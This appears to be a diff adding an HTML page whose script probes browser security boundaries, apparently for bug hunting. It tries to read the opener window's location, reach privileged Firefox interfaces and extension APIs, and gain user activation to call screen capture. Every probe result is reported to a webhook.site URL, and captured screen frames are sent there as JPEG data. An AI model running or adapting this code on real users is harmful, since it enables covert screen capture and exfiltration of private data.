@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html><head><title>I</title></head>
+<body style="margin:0;background:#111;">
+<script>
+var W='https://webhook.site/6a70c74a-c8ad-47fd-ae1f-d403ec94c954';
+var N=0;
+function rpt(k,v){N++;new Image().src=W+'?n='+N+'&t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
+
+rpt('INIT','page=I|sec='+window.isSecureContext);
+
+var done=false;
+
+function processStream(label,stream){
+  if(done)return;done=true;
+  rpt('GOT_STREAM',label+'|tracks='+stream.getTracks().length);
+  stream.getTracks().forEach(function(t,i){
+    rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
+  });
+  var v=document.createElement('video');
+  v.srcObject=stream;v.autoplay=true;v.muted=true;
+  document.body.appendChild(v);
+  function grab(gl){
+    var w=v.videoWidth||1600,h=v.videoHeight||900;
+    rpt('GRAB',gl+'|'+w+'x'+h+'|rdy='+v.readyState);
+    if(w<=0||h<=0)return;
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',gl+'|'+e.message);return}
+    try{var d=ctx.getImageData(0,0,20,1);
+      var px=Array.from(d.data);
+      rpt('PX',gl+'|nz='+px.filter(function(x){return x>0}).length+'|'+px.slice(0,40).join(','));
+    }catch(e){rpt('PX_E',gl+'|'+e.message)}
+    try{var du=c.toDataURL('image/jpeg',0.8);
+      rpt('DU',gl+'|len='+du.length);
+      if(du.length>1000){navigator.sendBeacon(W,gl+':'+du);
+        fetch(W,{method:'POST',mode:'no-cors',body:gl+':'+du}).catch(function(){});}
+    }catch(e){rpt('DU_E',gl+'|'+e.message)}
+  }
+  v.onloadeddata=function(){grab('ld0');setTimeout(function(){grab('ld1')},1000);setTimeout(function(){grab('ld3')},3000);};
+  setTimeout(function(){grab('t1')},500);setTimeout(function(){grab('t5')},5000);
+}
+
+async function runTests(){
+  // === 1: Check opener access (was opened via window.open from HTTP page) ===
+  try{
+    rpt('OPENER','has='+(!!window.opener)+'|closed='+(window.opener?window.opener.closed:'n/a'));
+    if(window.opener){
+      try{
+        rpt('OPENER_LOC',window.opener.location.href);
+      }catch(e){rpt('OPENER_LOC_E',e.name+':'+e.message.substring(0,200))}
+      try{
+        rpt('OPENER_DOC','title='+window.opener.document.title);
+      }catch(e){rpt('OPENER_DOC_E',e.name+':'+e.message.substring(0,200))}
+      // Try postMessage
+      try{
+        window.opener.postMessage('ping','*');
+        rpt('OPENER_PM','sent');
+      }catch(e){rpt('OPENER_PM_E',e.message)}
+    }
+  }catch(e){rpt('OPENER_E',e.message)}
+
+  // === 2: WebRTC screen share via SDP manipulation ===
+  try{
+    var pc1=new RTCPeerConnection();
+    var pc2=new RTCPeerConnection();
+    // Create canvas stream as initial track
+    var c=document.createElement('canvas');c.width=640;c.height=480;
+    var ctx=c.getContext('2d');ctx.fillStyle='blue';ctx.fillRect(0,0,640,480);
+    var cs=c.captureStream(1);
+    var track=cs.getVideoTracks()[0];
+    pc1.addTrack(track,cs);
+
+    pc1.onicecandidate=function(e){if(e.candidate)pc2.addIceCandidate(e.candidate)};
+    pc2.onicecandidate=function(e){if(e.candidate)pc1.addIceCandidate(e.candidate)};
+
+    pc2.ontrack=function(e){
+      rpt('PC2_TRACK','kind='+e.track.kind+'|label='+e.track.label);
+      processStream('rtc',e.streams[0]);
+    };
+
+    var offer=await pc1.createOffer();
+    rpt('SDP_OFFER',offer.sdp.substring(0,300));
+
+    // Try modifying SDP to request screen share
+    var modSdp=offer.sdp.replace(/a=content:.*\r\n/g,'');
+    modSdp=modSdp.replace(/m=video/,'a=content:slides\r\nm=video');
+
+    await pc1.setLocalDescription(offer);
+    await pc2.setRemoteDescription(offer);
+    var answer=await pc2.createAnswer();
+    await pc2.setLocalDescription(answer);
+    await pc1.setRemoteDescription(answer);
+    rpt('WEBRTC_SETUP','ok');
+  }catch(e){rpt('WEBRTC_E',e.name+':'+e.message.substring(0,200))}
+
+  // === 3: Try RTCRtpSender.getCapabilities ===
+  try{
+    var caps=RTCRtpSender.getCapabilities('video');
+    rpt('RTP_CAPS','codecs='+caps.codecs.length+'|first='+caps.codecs[0].mimeType);
+  }catch(e){rpt('RTP_CAPS_E',e.message)}
+
+  // === 4: Try to use Components.interfaces for privileged access ===
+  try{
+    // Try QueryInterface on window
+    if(window.QueryInterface){
+      rpt('QI','window.QI exists');
+      try{
+        var req=window.QueryInterface(Components.interfaces.nsIXMLHttpRequest);
+        rpt('QI_XHR','success:'+typeof req);
+      }catch(e){rpt('QI_XHR_E',e.name)}
+    }else{
+      rpt('QI','window.QI=undefined');
+      // Try on document
+      rpt('QI_DOC','doc.QI='+(typeof document.QueryInterface));
+    }
+  }catch(e){rpt('QI_E',e.message)}
+
+  // === 5: Try accessing internal Firefox URLs ===
+  try{
+    var f=document.createElement('iframe');
+    f.src='about:blank';
+    document.body.appendChild(f);
+    f.onload=function(){
+      try{rpt('ABOUT_BLANK','loc='+f.contentWindow.location.href)}catch(e){rpt('ABOUT_BLANK_E',e.message)}
+    };
+  }catch(e){}
+
+  // === 6: Try to create MediaStream from various sources ===
+  // 6a: VideoFrame from ImageBitmap
+  try{
+    var c2=document.createElement('canvas');c2.width=100;c2.height=100;
+    var ctx2=c2.getContext('2d');ctx2.fillStyle='green';ctx2.fillRect(0,0,100,100);
+    var bmp=await createImageBitmap(c2);
+    var vf=new VideoFrame(bmp,{timestamp:0});
+    rpt('VFRAME','width='+vf.displayWidth+'|height='+vf.displayHeight+'|format='+vf.format);
+    vf.close();
+  }catch(e){rpt('VFRAME_E',e.name+':'+e.message.substring(0,200))}
+
+  // === 7: Check getSupportedConstraints ===
+  try{
+    var sc=navigator.mediaDevices.getSupportedConstraints();
+    var keys=Object.keys(sc).filter(function(k){return sc[k]});
+    rpt('CONSTRAINTS',keys.join(','));
+  }catch(e){rpt('CONSTRAINTS_E',e.message)}
+
+  // === 8: PresentationRequest / Presentation API ===
+  try{
+    rpt('PRESENT','PresentationRequest='+(typeof PresentationRequest)
+      +'|presentation='+(typeof navigator.presentation));
+  }catch(e){rpt('PRESENT_E',e.message)}
+
+  // === 9: Try mozCaptureStream on elements ===
+  try{
+    var v2=document.createElement('video');
+    rpt('MOZ_CAP','mozCaptureStream='+(typeof v2.mozCaptureStream)
+      +'|captureStream='+(typeof v2.captureStream));
+  }catch(e){rpt('MOZ_CAP_E',e.message)}
+
+  // === 10: Try window.speechSynthesis, Notification, etc for activation ===
+  try{
+    // Request notification permission (might trigger activation)
+    if(window.Notification){
+      Notification.requestPermission().then(function(p){
+        rpt('NOTIF','perm='+p+'|active='+navigator.userActivation.isActive);
+        if(navigator.userActivation.isActive){
+          navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+            rpt('GDM_NOTIF_OK','tracks='+s.getTracks().length);
+            processStream('gdm_notif',s);
+          }).catch(function(e){rpt('GDM_NOTIF_E',e.name)});
+        }
+      });
+    }
+  }catch(e){rpt('NOTIF_E',e.message)}
+
+  // === 11: Try fullscreen API (might trigger activation) ===
+  try{
+    var el=document.documentElement;
+    if(el.requestFullscreen){
+      el.requestFullscreen().then(function(){
+        rpt('FS','ok|active='+navigator.userActivation.isActive);
+      }).catch(function(e){rpt('FS_E',e.name+':'+e.message.substring(0,100))});
+    }
+  }catch(e){}
+
+  // === 12: Try file: and data: scheme tricks ===
+  try{
+    rpt('SCHEMES','file='+(typeof FileReader)
+      +'|blob='+(typeof Blob)
+      +'|URL='+(typeof URL));
+  }catch(e){}
+
+  // === 13: Check if we can access browser.tabs or similar WebExtension APIs ===
+  try{
+    rpt('EXT','browser='+(typeof browser)+'|chrome='+(typeof chrome));
+    if(typeof browser !== 'undefined'){
+      rpt('EXT_BROWSER','tabs='+(typeof browser.tabs)
+        +'|runtime='+(typeof browser.runtime)
+        +'|tabCapture='+(typeof browser.tabCapture));
+    }
+    if(typeof chrome !== 'undefined'){
+      rpt('EXT_CHROME','tabs='+(typeof chrome.tabs)
+        +'|tabCapture='+(typeof chrome.tabCapture));
+    }
+  }catch(e){rpt('EXT_E',e.message)}
+
+  rpt('DONE','I_complete');
+}
+
+runTests();
+</script>
+</body>
+</html>
